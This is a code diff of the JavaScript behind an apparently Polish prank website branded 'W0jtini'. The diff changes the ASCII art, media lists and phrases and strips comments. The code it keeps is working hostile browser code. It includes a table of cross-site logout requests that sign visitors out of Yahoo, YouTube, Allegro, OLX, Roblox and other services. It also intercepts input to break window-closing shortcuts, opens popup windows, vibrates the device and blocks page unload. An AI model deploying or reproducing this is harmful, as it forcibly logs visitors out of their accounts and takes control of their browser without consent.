@@ -1,3 +1,11 @@
+//    ___       __       ________         ___      _________    ___      ________       ___     
+//   |\  \     |\  \    |\   __  \       |\  \    |\___   ___\ |\  \    |\   ___  \    |\  \    
+//   \ \  \    \ \  \   \ \  \|\  \      \ \  \   \|___ \  \_| \ \  \   \ \  \\ \  \   \ \  \   
+//    \ \  \  __\ \  \   \ \  \\\  \   __ \ \  \       \ \  \   \ \  \   \ \  \\ \  \   \ \  \  
+//     \ \  \|\__\_\  \   \ \  \\\  \ |\  \\_\  \       \ \  \   \ \  \   \ \  \\ \  \   \ \  \ 
+//      \ \____________\   \ \_______\\ \________\       \ \__\   \ \__\   \ \__\\ \__\   \ \__\
+//       \|____________|    \|_______| \|________|        \|__|    \|__|    \|__| \|__|    \|__|
+                                                                                           
 const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
 const WIN_WIDTH = 480
@@ -10,59 +18,32 @@ const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden
 
 const ART = [
   `
-┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
-┈┈┈┈╭━━━━━━╮┊☆ ┊┊
-┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
-┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
-┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
-☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
-┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
-  `,
-  `
-░░▓▓░░░░░░░░▓▓░░
-░▓▒▒▓░░░░░░▓▒▒▓░
-░▓▒▒▒▓░░░░▓▒▒▒▓░
-░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
-░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
-▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
-▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
-▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
-▓▒░░▒▒▒▒▒▒▒▒▒░░▓
-▓▒░░▒▓▒▒▓▒▒▓▒░░▓
-░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
-░░▓▒▒▒▒▒▒▒▒▒▒▓░░
-░░░▓▓▓▓▓▓▓▓▓▓░░░
+ ___       __       ________         ___      _________    ___      ________       ___     
+|\  \     |\  \    |\   __  \       |\  \    |\___   ___\ |\  \    |\   ___  \    |\  \    
+\ \  \    \ \  \   \ \  \|\  \      \ \  \   \|___ \  \_| \ \  \   \ \  \\ \  \   \ \  \   
+ \ \  \  __\ \  \   \ \  \\\  \   __ \ \  \       \ \  \   \ \  \   \ \  \\ \  \   \ \  \  
+  \ \  \|\__\_\  \   \ \  \\\  \ |\  \\_\  \       \ \  \   \ \  \   \ \  \\ \  \   \ \  \ 
+   \ \____________\   \ \_______\\ \________\       \ \__\   \ \__\   \ \__\\ \__\   \ \__\
+    \|____________|    \|_______| \|________|        \|__|    \|__|    \|__| \|__|    \|__|
   `
 ]
 
 const SEARCHES = [
   'W0jtini',
-  'Jaczup #2 Lepszy W0jtini',
-  '',
-  'kanarek',
-  'jaczup'
+  'Jaczup #2 Lepszy W0jtini'
 ]
 
 const VIDEOS = [
-  'files/media/gratulacje.mp4'
+  'files/media/gratulacje.mp4',
+  'files/media/W0jtini.mov'
 ]
 
 const FILE_DOWNLOADS = [
-  'media/images/ptok.jpg',
-  'media/images/jaczup.jpg',
-  'media/images/jaczupme.jpg',
-  'media/images/ptoszek.jpg',
-  'media/images/ptakwspodniach.jpg',
-  'media/images/kichajacyptoszek.jpg',
-  'media/images/lubieptoszki.png',
-  'media/images/zimowyptoszek.jpeg', // added by @dan64iel
-  'media/images/zlyptok.jpeg', //added by @imzeme
-  'media/images/grubyptok.jpg' //added by @imzeme
+  'files/media/W0jtini.mov'
 ]
 
 const PHRASES = [
   'Strona przez wojtiniego',
-  'Akurat potwierdzam że to nie virus. Żart! To też nie prawda bo robie to w Prima Aprilis. A to też żart bo to jest 4 dni pózniej. Więc to nie jest virus',
   'Ptoszek #2 Ale to jest podobne do tego.'
 ]
 
@@ -87,74 +68,38 @@ const LOGOUT_SITES = {
   Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
   YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
   JShop: ['GET', 'https://jshop.partners/panel/logout'],
-  Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression
-  Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression
-  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression
+  Vimeo: ['GET', 'https://vimeo.com/log_out'],
+  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
+  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'],
   OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression
-  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression
-  OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression
-  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'] // added by @cryblanka
+  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'],
+  OLX: ['GET', 'https://www.olx.pl/account/logout'],
+  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout']
 }
 
-/**
- * Array to store the child windows spawned by this window.
- */
 const wins = []
-
-/**
- * Count of number of clicks
- */
 let interactionCount = 0
-
-/**
- * Number of iframes injected into the page for the "super logout" functionality.
- * See superLogout().
- */
 let numSuperLogoutIframes = 0
 
-/**
- * Is this window a child window? A window is a child window if there exists a
- * parent window (i.e. the window was opened by another window so `window.opener`
- * is set) *AND* that parent is a window on the same origin (i.e. the window was
- * opened by us, not an external website)
- */
 const isChildWindow = (window.opener && isParentSameOrigin()) ||
   window.location.search.indexOf('child=true') !== -1
 
-/**
- * Is this window a parent window?
- */
 const isParentWindow = !isChildWindow
 
-/*
- * Run this code in all windows, *both* child and parent windows.
- */
 init()
 
-/*
- * Use `window.opener` to detect if this window was opened by another window, which
- * will be its parent. The `window.opener` variable is a reference to the parent
- * window.
- */
 if (isChildWindow) initChildWindow()
 else initParentWindow()
 
-/**
- * Initialization code for *both* parent and child windows.
- */
 function init () {
   confirmPageUnload()
 
   interceptUserInput(event => {
     interactionCount += 1
 
-    // Prevent default behavior (breaks closing window shortcuts)
     event.preventDefault()
     event.stopPropagation()
 
-    // 'touchstart' and 'touchend' events are not able to open a new window
-    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
-    // a clever way to exclude touch events.
     if (event.which !== 0) openWindow()
 
     startVibrateInterval()
